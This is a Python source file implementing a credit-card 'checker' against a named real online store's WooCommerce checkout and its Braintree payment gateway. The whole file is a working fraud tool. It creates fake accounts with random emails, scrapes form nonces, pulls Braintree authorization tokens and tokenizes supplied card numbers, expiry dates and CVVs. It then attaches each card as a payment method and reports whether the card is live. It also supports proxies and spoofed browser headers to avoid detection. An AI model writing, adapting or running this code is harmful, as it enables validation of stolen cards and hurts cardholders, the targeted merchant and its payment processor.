import requests
import random
import string
import re
import base64
import json
from bs4 import BeautifulSoup

def generate_random_email(length=10):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length)) + "@gmail.com"

def check_card(cc, month, year, cvv, proxy=None):
    """
    Returns (is_live: bool, message: str)
    Exactly mirrors the original working b3 auth script.
    """
    s = requests.Session()
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}

    ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'

    try:
        # ── Step 1: Get registration nonce ──
        resp = s.post('https://www.flagworld.com.au/my-account/',
                      headers={'User-Agent': ua,
                               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                               'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                               'Cache-Control': 'max-age=0',
                               'Content-Type': 'application/x-www-form-urlencoded',
                               'Origin': 'https://www.flagworld.com.au',
                               'Referer': 'https://www.flagworld.com.au/my-account/add-payment-method/',
                               'Sec-CH-UA': '"Chromium";v="139", "Not;A=Brand";v="99"',
                               'Sec-CH-UA-Mobile': '?1',
                               'Sec-CH-UA-Platform': '"Android"',
                               'Sec-Fetch-Dest': 'document',
                               'Sec-Fetch-Mode': 'navigate',
                               'Sec-Fetch-Site': 'same-origin',
                               'Sec-Fetch-User': '?1',
                               'Upgrade-Insecure-Requests': '1'})
        reg_nonce = re.search(r'name="woocommerce-register-nonce".*?value="([^"]+)"', resp.text)
        if not reg_nonce:
            return False, "Registration nonce not found"
        reg_nonce = reg_nonce.group(1)

        # ── Step 2: Register user with all attribution fields ──
        email = generate_random_email()
        reg_data = {
            'email': email,
            'billing_phone': '15068596852',
            'billing_company': 'waysss',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://www.flagworld.com.au/my-account/add-payment-method/',
            'wc_order_attribution_session_start_time': '2026-04-22 19:14:02',
            'wc_order_attribution_session_pages': '1',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': ua,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'register': 'Register',
        }
        resp = s.post('https://www.flagworld.com.au/my-account/add-payment-method/',
                      headers={'User-Agent': ua,
                               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                               'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                               'Cache-Control': 'max-age=0',
                               'Content-Type': 'application/x-www-form-urlencoded',
                               'Origin': 'https://www.flagworld.com.au',
                               'Referer': 'https://www.flagworld.com.au/my-account/add-payment-method/',
                               'Sec-CH-UA': '"Chromium";v="139", "Not;A=Brand";v="99"',
                               'Sec-CH-UA-Mobile': '?1',
                               'Sec-CH-UA-Platform': '"Android"',
                               'Sec-Fetch-Dest': 'document',
                               'Sec-Fetch-Mode': 'navigate',
                               'Sec-Fetch-Site': 'same-origin',
                               'Sec-Fetch-User': '?1',
                               'Upgrade-Insecure-Requests': '1'},
                      data=reg_data)

        # ── Step 3: Get client token nonce and add-payment-method nonce ──
        resp = s.get('https://www.flagworld.com.au/my-account/add-payment-method/',
                     headers={'User-Agent': ua,
                              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                              'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                              'Cache-Control': 'max-age=0',
                              'Sec-CH-UA': '"Chromium";v="139", "Not;A=Brand";v="99"',
                              'Sec-CH-UA-Mobile': '?1',
                              'Sec-CH-UA-Platform': '"Android"',
                              'Sec-Fetch-Dest': 'document',
                              'Sec-Fetch-Mode': 'navigate',
                              'Sec-Fetch-Site': 'same-origin',
                              'Sec-Fetch-User': '?1',
                              'Upgrade-Insecure-Requests': '1'})
        client_nonce = re.search(r'"client_token_nonce":"([^"]+)"', resp.text)
        add_nonce = re.search(r'id="woocommerce-add-payment-method-nonce".*?value="([^"]+)"', resp.text)
        if not client_nonce or not add_nonce:
            return False, "Client nonce or add payment method nonce not found"
        client_nonce = client_nonce.group(1)
        add_nonce = add_nonce.group(1)

        # ── Step 4: Get Braintree authorization fingerprint ──
        resp = s.post('https://www.flagworld.com.au/wp-admin/admin-ajax.php',
                      data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce},
                      headers={'User-Agent': ua,
                               'X-Requested-With': 'XMLHttpRequest',
                               'Accept': '*/*',
                               'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                               'Origin': 'https://www.flagworld.com.au',
                               'Referer': 'https://www.flagworld.com.au/my-account/add-payment-method/'})
        try:
            enc = resp.json()['data']
        except Exception:
            return False, "Invalid response for Braintree token"
        decoded = json.loads(base64.b64decode(enc).decode())
        auth_fingerprint = decoded.get('authorizationFingerprint')
        if not auth_fingerprint:
            return False, "Braintree auth fingerprint missing"

        # ── Step 5: Tokenize credit card (first time) ──
        bt_headers = {
            'Authorization': f'Bearer {auth_fingerprint}',
            'Content-Type': 'application/json',
            'Braintree-version': '2018-05-10',
            'User-Agent': ua,
            'Accept': '*/*',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Origin': 'https://assets.braintreegateway.com',
            'Referer': 'https://assets.braintreegateway.com/',
        }
        tokenize_payload = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '75e33920-44f7-4d60-955b-53092d4f34fe',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': month,
                        'expirationYear': year,
                        'cvv': cvv,
                    },
                    'options': {'validate': False},
                },
            },
        }
        resp = s.post('https://payments.braintree-api.com/graphql',
                      headers=bt_headers, json=tokenize_payload, timeout=15)
        try:
            token = resp.json()['data']['tokenizeCreditCard']['token']
        except Exception:
            return False, "Tokenization failed (check card details / network)"

        # ── Step 6: Duplicate registration POST (mirrors original) ──
        resp = s.post('https://www.flagworld.com.au/my-account/add-payment-method/',
                      headers={'User-Agent': ua,
                               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                               'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                               'Cache-Control': 'max-age=0',
                               'Content-Type': 'application/x-www-form-urlencoded',
                               'Origin': 'https://www.flagworld.com.au',
                               'wc_order_attribution_utm_source': '(direct)',
                               'wc_order_attribution_utm_medium': '(none)',
                               'wc_order_attribution_utm_content': '(none)',
                               'wc_order_attribution_utm_id': '(none)',
                               'wc_order_attribution_utm_term': '(none)',
                               'wc_order_attribution_utm_source_platform': '(none)',
                               'wc_order_attribution_utm_creative_format': '(none)',
                               'wc_order_attribution_utm_marketing_tactic': '(none)',
                               'wc_order_attribution_session_entry': 'https://www.flagworld.com.au/my-account/add-payment-method/',
                               'wc_order_attribution_session_start_time': '2026-04-22 19:14:02',
                               'wc_order_attribution_session_pages': '1',
                               'wc_order_attribution_session_count': '1',
                               'wc_order_attribution_user_agent': ua,
                               'woocommerce-register-nonce': reg_nonce,
                               '_wp_http_referer': '/my-account/add-payment-method/',
                               'register': 'Register'},
                      data=reg_data)

        # ── Step 7: Get fresh nonces (duplicate) ──
        resp = s.get('https://www.flagworld.com.au/my-account/add-payment-method/',
                     headers={'User-Agent': ua,
                              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                              'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                              'Cache-Control': 'max-age=0',
                              'Referer': 'https://www.flagworld.com.au/my-account/add-payment-method/',
                              'Sec-CH-UA': '"Chromium";v="139", "Not;A=Brand";v="99"',
                              'Sec-CH-UA-Mobile': '?1',
                              'Sec-CH-UA-Platform': '"Android"',
                              'Sec-Fetch-Dest': 'document',
                              'Sec-Fetch-Mode': 'navigate',
                              'Sec-Fetch-Site': 'same-origin',
                              'Sec-Fetch-User': '?1',
                              'Upgrade-Insecure-Requests': '1'})
        client_nonce2 = re.search(r'"client_token_nonce":"([^"]+)"', resp.text)
        add_nonce2 = re.search(r'id="woocommerce-add-payment-method-nonce".*?value="([^"]+)"', resp.text)
        if not client_nonce2 or not add_nonce2:
            return False, "Fresh nonces not found"
        client_nonce2 = client_nonce2.group(1)
        add_nonce2 = add_nonce2.group(1)

        # ── Step 8: Get Braintree auth again ──
        resp = s.post('https://www.flagworld.com.au/wp-admin/admin-ajax.php',
                      data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce2},
                      headers={'User-Agent': ua,
                               'X-Requested-With': 'XMLHttpRequest',
                               'Accept': '*/*',
                               'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                               'Origin': 'https://www.flagworld.com.au',
                               'Referer': 'https://www.flagworld.com.au/my-account/add-payment-method/'})
        try:
            enc2 = resp.json()['data']
        except Exception:
            return False, "Second Braintree token request failed"
        decoded2 = json.loads(base64.b64decode(enc2).decode())
        auth_fingerprint2 = decoded2.get('authorizationFingerprint')
        if not auth_fingerprint2:
            return False, "Second auth fingerprint missing"

        # ── Step 9: Tokenize again ──
        bt_headers2 = bt_headers.copy()
        bt_headers2['Authorization'] = f'Bearer {auth_fingerprint2}'
        resp = s.post('https://payments.braintree-api.com/graphql',
                      headers=bt_headers2, json=tokenize_payload, timeout=15)
        try:
            token2 = resp.json()['data']['tokenizeCreditCard']['token']
        except Exception:
            return False, "Second tokenization failed"

        # ── Step 10: Add payment method ──
        add_data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'master-card',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token2,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': add_nonce2,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        resp = s.post('https://www.flagworld.com.au/my-account/add-payment-method/',
                      headers={'User-Agent': ua,
                               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                               'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                               'Cache-Control': 'max-age=0',
                               'Content-Type': 'application/x-www-form-urlencoded',
                               'Origin': 'https://www.flagworld.com.au',
                               'Referer': 'https://www.flagworld.com.au/my-account/add-payment-method/'},
                      data=add_data)

        # ── Parse result ──
        soup = BeautifulSoup(resp.text, 'html.parser')
        msg = None
        div = soup.find('div', class_='message-container')
        if div:
            msg = div.get_text(strip=True)
        if not msg:
            span = soup.find('span', class_='message-icon')
            if span and span.next_sibling:
                msg = span.next_sibling.strip()
        if not msg:
            ul = soup.find('ul', class_='woocommerce-error')
            if ul:
                msg = ul.get_text(strip=True)
        if not msg:
            success_div = soup.find('div', class_='woocommerce-message')
            if success_div:
                msg = success_div.get_text(strip=True)

        if msg and ('added' in msg.lower() or 'success' in msg.lower() or 'payment method' in msg.lower()):
            return True, msg
        else:
            return False, msg or 'Unknown error'

    except requests.exceptions.ProxyError:
        return False, "Proxy error"
    except requests.exceptions.ConnectTimeout:
        return False, "Connection timeout"
    except Exception as e:
        return False, f"Unexpected error: {str(e)[:150]}"
